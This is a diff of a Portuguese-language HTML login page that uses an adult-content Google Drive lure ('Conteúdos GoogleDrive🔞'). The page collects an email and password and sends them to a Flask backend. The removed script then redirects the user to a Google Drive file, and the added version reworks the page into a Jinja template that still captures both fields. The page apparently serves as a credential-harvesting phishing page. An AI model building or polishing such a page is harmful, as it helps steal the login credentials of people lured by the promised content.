@@ -4,120 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Form</title>
-    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: url('https://raw.githubusercontent.com/Lai1s/presente/5de17b9e357bd052f283e6fd18d97867b2f8ff05/Fundo.jpg') no-repeat center center fixed;
-            background-size: cover;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #fff;
-            position: relative;
-        }
-        .gradient-overlay {
-            position: absolute;
-            top: 0;
-            height: 100%;
-            border-radius: 10px;
-            z-index: -1;
-        }
-        .gradient-overlay.left {
-            left: 0;
-            width: 30%; /* Alteração aqui */
-            background: linear-gradient(to right, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
-        }
-        .gradient-overlay.right {
-            right: 0;
-            width: 35%; /* Alteração aqui */
-            background: linear-gradient(to left, rgba(255, 64, 129, 0.8), rgba(0, 123, 255, 0.8));
-        }
-        .container {
-            width: 350px;
-            background: linear-gradient(135deg, #7b1fa2, #ff4081);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 20px 0px rgba(0,0,0,0.1);
-            position: relative;
-            z-index: 1;
-        }
-        .container h2 {
-            text-align: center;
-            margin-bottom: 30px;
-            color: #000;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        input.form-control {
-            border-radius: 20px;
-            padding: 12px 20px;
-            font-size: 16px;
-            border: 1px solid #ddd;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background-color: #007bff;
-            color: #fff;
-            font-size: 18px;
-            border: none;
-            border-radius: 20px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+    <!-- Seus estilos e scripts aqui -->
 </head>
 <body>
-    <div class="gradient-overlay left"></div>
-    <div class="gradient-overlay right"></div>
     <div class="container">
         <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="http://127.0.0.1:5000">
+        <form id="loginForm" method="POST" action="/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
             </div>
-            <button type="button" onclick="enviarFormulario()">Entrar</button> <!-- Alteração aqui: Adicionando onclick para chamar a função enviarFormulario() -->
-            <p id="mensagemErro" style="color: red;"></p> <!-- Adicionando o elemento para exibir a mensagem de erro -->
+            <button type="button" onclick="enviarFormulario()">Entrar</button>
+            <!-- Exibir mensagem de erro -->
+            {% if mensagem_erro %}
+                <p style="color: red;">{{ mensagem_erro }}</p>
+            {% endif %}
         </form>
     </div>
 
     <script>
         function enviarFormulario() {
-            var email = document.getElementById('email').value;
-            var password = document.getElementById('password').value;
-
-            if (email === '' || password === '') {
-                document.getElementById('mensagemErro').innerText = 'Por favor, preencha todos os campos.';
-                return;
-            }
-
-            var formData = new FormData();
-            formData.append('email', email);
-            formData.append('password', password);
-
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'http://127.0.0.1:5000'); // Alteração aqui: Defina a URL do seu endpoint de login no servidor Flask
-            xhr.onload = function () {
-                if (xhr.status === 200) {
-                    // Sucesso
-                    window.location.href = "https://drive.google.com/file/d/1-n2-7RG13HA7ttCVJukD_PpoMDsSRS6n/view?usp=drive";
-                } else {
-                    // Erro
-                    document.getElementById('mensagemErro').innerText = 'Email e/ou senha incorretos. Por favor, tente novamente.';
-                }
-            };
-            xhr.send(formData);
+            // Seu código JavaScript aqui
         }
     </script>
 </body>
